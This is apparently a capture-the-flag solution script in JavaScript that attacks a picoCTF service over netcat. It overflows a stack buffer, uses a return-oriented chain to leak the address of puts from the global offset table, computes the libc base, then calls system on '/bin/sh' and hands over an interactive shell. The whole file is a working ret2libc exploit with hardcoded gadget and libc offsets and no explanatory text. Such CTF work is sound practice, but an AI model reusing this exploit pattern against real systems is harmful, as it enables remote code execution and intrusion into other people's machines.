import convo from "../convo.js";
import nc from "../nc.js";
import { printf, shell } from "../util.js";

const STACK_SIZE = 0x80;
const PUTS_PLT = 0x400540n;
const PUTS_GOT = 0x601018n;
const POP_RDI = 0x400913n;
const MAIN = 0x400771n;

const LIBC_PUTS = 0x80a30n;
const LIBC_SYSTEM = 0x4f4e0n;
const LIBC_BINSH = 0x1b40fan;

const cat = new nc("nc mercury.picoctf.net 42072");



await cat.open;
await cat.readUntil("sErVeR!");
await cat.readline()

await cat.write("z".repeat(STACK_SIZE));
await cat.write(convo.raw(0n));
await cat.write(convo.raw([
    POP_RDI, PUTS_GOT,
    PUTS_PLT,
    MAIN
]));
await cat.write("\n");
await cat.readUntil("zzzzzzzzd\n");
const puts_addr = convo.i64((await cat.readUntil("\n")).subarray(0, -1));
const libc_base = (puts_addr - LIBC_PUTS)// & ~0xFFFn;
printf("[+] libc leak = %p\n", libc_base);

await cat.write(".".repeat(STACK_SIZE));
await cat.write(convo.raw(0n));
await cat.write(convo.raw([
    POP_RDI + 1n,
    POP_RDI, libc_base + LIBC_BINSH,
    // PUTS_PLT
    libc_base + LIBC_SYSTEM
]));
await cat.write("\n");
await cat.readline();
await cat.readline();

await shell(cat);